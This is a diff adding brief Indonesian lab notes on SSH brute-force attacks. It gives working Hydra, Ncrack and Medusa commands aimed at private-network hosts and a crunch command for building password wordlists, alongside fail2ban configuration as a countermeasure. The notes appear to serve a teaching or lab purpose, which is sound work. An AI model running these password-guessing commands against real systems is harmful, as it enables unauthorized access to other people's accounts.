@@ -1,0 +1,35 @@
+BRUTE FORCE ATTACK//////////
+
+HYDRA
+hydra -l nafiar -P /root/wordlist.txt -t 64 10.151.34.43 ssh
+
+NCRACK
+ncrack -v --user nafiar -P wordlist.txt ssh://10.151.34.43
+
+MEDUSA
+medusa -u rafiar -P wordlist.txt -h 10.151.32.131 -M ssh
+
+
+
+
+BRUTE FORCE COUNTERMEASURE////
+
+FAIL2BAN
+-mendownload dan mengekstrak
+-masuk ke folder /etc/fail2ban
+-mengcopy dan merename file jail.conf menjadi jail.local (cp jail.conf jail.local)
+-mengonfigurasi bantime, findtime dan maxretry
+ bantime = 60
+ findtime = 60
+ maxretry = 2
+-mengaktifkan fail2ban (sudo /etc/init.d/fail2ban start)
+
+
+
+APLIKASI TAMBAHAN/////////////
+
+CRUNCH - password dictionary generator
+crunch  adalah tools membuat password dictionary yang akan digunakan ketika melakukan serangan bruteforce menggunakan hydra, ncrack dan medusa.
+crunch 8 8 "12790" -o passwordlist.txt
+pada singkat tersebut, parameter yang digunakan adalah:
+crunch [panjang minimal] [panjang maksimal] [karakter yang digunakan] -o [nama file output]
